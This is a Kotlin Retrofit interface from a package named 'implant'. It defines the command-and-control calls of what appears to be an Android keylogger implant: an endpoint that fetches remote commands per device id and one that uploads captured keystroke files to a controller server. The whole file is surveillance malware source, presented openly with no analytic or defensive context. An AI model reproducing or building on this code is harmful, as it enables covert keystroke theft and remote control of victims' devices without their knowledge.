package com.cooperthecoder.implant.network

import com.cooperthecoder.implant.model.Command
import okhttp3.MultipartBody
import retrofit2.Call
import retrofit2.http.*

interface ControlService {
    @GET("commands/{id}")
   fun getCommands(@Path("id") id: String): Call<Command>

    @Multipart
    @POST("keystrokes/{id}")
    fun uploadKeystrokes(@Path("id") id: String, @Part file: MultipartBody.Part)
}